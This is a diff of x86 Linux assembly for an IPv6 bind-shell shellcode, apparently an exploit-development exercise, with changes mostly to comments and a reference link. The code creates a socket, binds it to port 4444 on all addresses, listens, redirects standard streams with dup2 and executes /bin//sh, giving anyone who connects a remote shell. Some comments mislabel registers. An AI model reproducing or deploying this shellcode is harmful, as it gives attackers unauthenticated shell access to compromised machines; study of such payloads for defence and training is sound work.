@@ -6,7 +6,7 @@ _start:
  ;(1)http://syscalls.kernelgrok.com/
  ;(2)https://www.3dbrew.org/wiki/Socket_Services
  ;(3)http://osr600doc.xinuos.com/en/SDK_netapi/sockC.TheIPv6sockaddrstructure.html
- ;(4)call id's in /usr/include/linux/net.h
+ ;(4)http://www.qnx.com/developers/docs/6.5.0/index.jsp?topic=%2Fcom.qnx.doc.neutrino_lib_ref%2Fi%2Finet6_proto.html
  
 ;IPV6 socket creation 
 ;int socketcall(int call, unsigned long *args);
@@ -31,16 +31,16 @@ push DWORD eax   ;x4 dword ipv6 loopback
 push DWORD eax
 push DWORD eax
 push DWORD eax
-push DWORD eax   ;sin6_addr
+push eax         ;host_addr.sin6_addr = in6addr_any | in6addr_any=::0
 push WORD 0x5c11 ;port 4444
 push WORD 0x0a   ;AF_INET6
 mov ecx,esp		 ;ECX holds pointer to struct sockaddr
 push byte 0x1c 	 ;sizeof(sockaddr)
-push ecx		 ;sizeof(sockaddr_in6)
+push ecx		 ;pointer to sockfd
 push esi		 ;sockfd
-mov ecx,esp		 ; ECX points to args
-inc ebx			 ; EBX = 0x2 | #define SYS_BIND 2
-push byte 0x66	 ; socketcall() 
+mov ecx,esp		 ;ECX points to args
+inc ebx			 ;EBX = 0x2 | #define SYS_BIND 2
+push byte 0x66	 ;socketcall() 
 pop eax
 int 80h
  
@@ -51,7 +51,7 @@ push ebx 		 ;EBX=2 | backlog=2
 push esi		 ;poiter to sockfd
 mov ecx,esp		 ;ECX points to args 
 inc ebx
-inc ebx			 ;EBX = 0x4| #define SYS_LISTEN 4 
+inc ebx			 ;EBX=0x4 | #define SYS_LISTEN 4 
 push byte 0x66
 pop eax	         ;socketcall()
 int 80h
@@ -80,7 +80,7 @@ loop:
     pop eax		 ;ECX = 0x3f
     int 0x80     ;exec sys_dup2
     dec ecx      ;decrement loop-counter
-    jns loop     ;if SF not set ==> keep jumping
+    jns loop     ;SF not set? then keep on jumping
  
 ;;execve(/bin//sh)
 xor ecx,ecx         ;clear ECX
